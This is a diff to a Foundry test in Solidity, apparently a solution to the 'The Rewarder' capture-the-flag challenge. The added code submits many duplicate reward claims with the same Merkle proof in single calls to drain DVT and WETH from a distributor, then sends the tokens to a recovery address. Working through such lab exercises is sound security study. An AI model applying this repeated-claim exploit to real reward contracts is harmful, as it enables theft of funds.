@@ -170,9 +170,10 @@ contract TheRewarderChallenge is Test {
         bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
         uint256 batchNumber = distributor.getNextBatchNumber(address(dvt));
 
-        Claim[] memory claims = new Claim[](dvtTimes + 1);
+        Claim[] memory claims = new Claim[](dvtNumber + 1);
+        Claim[] memory wethClaims = new Claim[](wethNumber + 1);
 
-        console.log(dvtBal); // before claim
+        // console.log(dvtBal); // before claim
 
         for (uint256 i = 0; i < dvtNumber; i++) {
             claims[i] = Claim({
@@ -191,11 +192,31 @@ contract TheRewarderChallenge is Test {
             proof: merkle.getProof(wethLeaves, playerIndex)
         });
 
-       
-
         distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
 
-        console.log(dvtBal); //after claim
+         for (uint256 i = 0; i < wethNumber; i++) {
+            wethClaims[i] = Claim({
+                batchNumber: 0,
+                amount: playerWethAmount,
+                tokenIndex: 1,
+                proof: merkle.getProof(wethLeaves, playerIndex)
+            });
+        }
+
+        wethClaims[wethNumber] = Claim({
+            batchNumber: 0,
+            amount: playerDvtAmount,
+            tokenIndex: 0,
+            proof: merkle.getProof(dvtLeaves, playerIndex)
+        });
+
+        distributor.claimRewards({inputClaims: wethClaims, inputTokens: tokensToClaim});
+
+        // Send everything to recovery
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
+
+        // console.log(dvtBal); //after claim
 
 
 
